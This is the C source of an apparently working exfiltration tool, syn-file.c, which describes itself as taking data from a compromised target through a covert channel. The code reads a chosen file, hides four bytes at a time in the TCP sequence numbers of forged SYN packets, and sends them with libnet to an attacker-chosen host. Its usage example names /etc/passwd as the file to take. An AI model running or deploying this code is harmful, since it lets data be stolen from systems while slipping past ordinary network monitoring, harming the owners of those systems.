/*
 * syn-file.c
 *
 * Exfiltrate data from a compromised target using covert channels.
 *
 * Exfiltrates a given file using TCP seq numbers of SYN packets using a given codification technique.
 *
 * (c) spinfoo
 */


#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#define VERSION "1.2"

void usage(char *name) {
	fprintf(stderr, "usage: %s -i eth0 -d 192.168.0.158 -f /etc/passwd -p 8080 -P 8081\n", name);
}

void error(char *cmd, char *name) {
	fprintf(stderr, "%s %s: %s\n", cmd, VERSION, name);
	exit(EXIT_FAILURE);
}

void lerror(char *msg, libnet_t *l) {
    fprintf(stderr, "libnet error: %s.\n", msg);
    libnet_destroy(l);
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
	int c;
	libnet_t *l, *q;
	libnet_ptag_t t;
	char *payload;
	u_short payload_s;
	u_long src_ip, dst_ip;
	u_short src_prt, dst_prt;
	char errbuf[LIBNET_ERRBUF_SIZE];
	int fd;
	char buf[5];
    char devname[64], file[128];
    int seq;
    int pkt;
    u_char enet_src[6];
    u_char enet_dst[6] = {0x00, 0x0c, 0x29, 0xa5, 0x46, 0x6d};
    struct libnet_ether_addr *mac_src;
    
	src_ip  = 0;
	dst_ip  = 0;
	src_prt = 0;
	dst_prt = 0;
	payload = NULL;
	payload_s = 0;
    pkt= 1;
    devname[0]= '\0';
    file[0]= '\0';
    
    
	if (getuid() != 0) {
		error(argv[0], "Sorry you must be root.");
	}
    
    q = libnet_init(LIBNET_LINK, NULL, errbuf);
    if (q == NULL) {
        error(argv[0], "libnet_init() failed\n"); 
    }
    
	while ((c = getopt(argc, argv, "i:d:f:p:P:")) != EOF) {
		switch (c) {
			case 'i':
                strncpy(devname, optarg, sizeof(devname)-1);
                fprintf(stderr, "using interface: %s\n", devname);
				break;
			case 'd':
				if ((dst_ip = libnet_name2addr4(q, optarg, LIBNET_RESOLVE)) == -1) {
					fprintf(stderr, "Bad destination IP address: %s\n", optarg);
					exit(EXIT_FAILURE);
				}
				break;
    		case 'f':
                strncpy(file, optarg, sizeof(file)-1);
				break;
			case 'p':
                dst_prt= (u_short)atoi(optarg);
				break;
            case 'P':
                src_prt= (u_short)atoi(optarg);
                break;
			default:
				exit(EXIT_FAILURE);
		}
	}
    libnet_destroy(q);

	if (*devname == '\0' || !dst_ip || *file == '\0' || !src_prt ||  !dst_prt) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	fd= open(file, O_RDONLY);
	if (fd == -1) {
		 error(argv[0], "Could not open file\n");
	}
    
	while ( 1 ) {
        l = libnet_init(
                LIBNET_LINK,                            /* injection type */
                devname,                                /* network interface */
                errbuf);                                /* error buffer */
    
        if (l == NULL) {
            error(argv[0], "libnet_init() failed\n"); 
        }

    	if ( read(fd, &buf, 4) < 1 ) {
            break;
        }
        buf[4]= '\0';
                
        fprintf(stderr, "#%d\t", pkt++);
		fprintf(stderr, " [Read from file \"%s\"] ", buf);
        // Encoding 4 bytes in an integer
        seq= buf[0] << 24 | buf[1] << 16 | buf[2] << 8 | buf[3];
        fprintf(stderr, "[Encoded SEQ nr: 0x%x] ", seq);

		t = libnet_build_tcp_options(
            (uint8_t*)"\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000", // 20 bytes, decode with Wireshark
            20,
            l,
            0);
        
		if (t == -1) {
            lerror("Can't build TCP options", l);
		}

		t = libnet_build_tcp(
            src_prt,                                    /* source port */
            dst_prt,                                    /* destination port */
            seq,                                        /* sequence number */
            0x00000000,                                 /* acknowledgement num */
            TH_SYN,                                     /* control flags */
            32767,                                      /* window size */
            0,                                          /* checksum */
            0,                                          /* urgent pointer */
            LIBNET_TCP_H + 20 + payload_s,              /* TCP packet size */
            (uint8_t*)payload,                          /* payload */
            payload_s,                                  /* payload size */
            l,                                          /* libnet handle */
            0);                                         /* libnet id */
        
		if (t == -1) {
            lerror("Can't build TCP header", l);
		}
	
		t = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,  /* length */
			0,                                          /* TOS */
            242,                                        /* IP ID */
            0,                                          /* IP Frag */
            64,                                         /* TTL */
            IPPROTO_TCP,                                /* protocol */
            0,                                          /* checksum */
            src_ip,                                     /* source IP */
            dst_ip,                                     /* destination IP */
            NULL,                                       /* payload */
            0,                                          /* payload size */
            l,                                          /* libnet handle */
            0);                                         /* libnet id */

		if (t == -1) {
            lerror("Can't build IP header", l);
		}
        
        if ((mac_src = libnet_get_hwaddr(l)) == NULL) {
    		lerror("Unable to determine own MAC address", l);
        }
        enet_src[0]= mac_src->ether_addr_octet[0];
        enet_src[1]= mac_src->ether_addr_octet[1];
        enet_src[2]= mac_src->ether_addr_octet[2];
        enet_src[3]= mac_src->ether_addr_octet[3];
        enet_src[4]= mac_src->ether_addr_octet[4];
        enet_src[5]= mac_src->ether_addr_octet[5];

        if ((src_ip = libnet_get_ipaddr4(l)) == -1) {
    		lerror("Unable to determine own IP address", l);
        }
	  
		t = libnet_build_ethernet(
            enet_dst,                                   /* ethernet destination */
            enet_src,                                   /* ethernet source */
            ETHERTYPE_IP,                               /* protocol type */
            NULL,                                       /* payload */
            0,                                          /* payload size */
            l,                                          /* libnet handle */
            0);                                         /* libnet id */

		if (t == -1) {
            lerror("Can't build ethernet header", l);
		}
	
		/*
		 *  Write it to the wire.
		 */
		c = libnet_write(l);
		if (c == -1) {
			lerror("Write error", l);
		}
		else {
			fprintf(stderr, "[Wrote %d bytes]\n", c);
		}
        libnet_destroy(l);
        l= 0;
	} /* while */
	close(fd);
	return (EXIT_SUCCESS);
}
